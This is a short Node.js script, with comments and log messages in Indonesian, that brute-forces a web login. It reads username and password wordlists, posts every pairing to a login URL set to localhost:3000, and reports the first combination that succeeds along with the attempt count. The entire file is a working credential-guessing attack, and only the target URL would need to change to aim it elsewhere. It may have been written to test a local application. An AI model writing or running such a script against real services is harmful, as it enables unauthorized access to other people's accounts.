const axios = require('axios');
const fs = require('fs');

async function bruteforce() {
  const usernameList = fs.readFileSync('usernames.txt', 'utf-8').split('\n').map(username => username.trim());
  const passwordList = fs.readFileSync('passwords.txt', 'utf-8').split('\n').map(password => password.trim());
  
  const targetURL = 'http://localhost:3000/login'; // URL login website
  
  let attemptCount = 0;
  
  for (const username of usernameList) {
    for (const password of passwordList) {
      attemptCount++;
      try {
        const response = await axios.post(targetURL, {
          username: username,
          password: password,
        });
        if (response.status === 200) {
          // Jika status HTTP adalah 200 (berhasil), cek respons JSON
          if (response.data.success) {
            console.log(`Login sukses - Username: ${username}, Password: ${password}`);
            console.log(`Percobaan ke-${attemptCount}`);
            return;
          }
        } else {
          console.log(`Full Response: ${response}`);
        }
      } catch (error) {
        // Kesalahan disebabkan oleh login gagal
        console.log(`Gagal - Username: ${username}, Password: ${password}`);
        console.log(`Percobaan ke-${attemptCount}`);
      }
    }
  }
  console.log('Tidak ada kombinasi yang berhasil.');
  console.log(`Total percobaan: ${attemptCount}`);
}

bruteforce();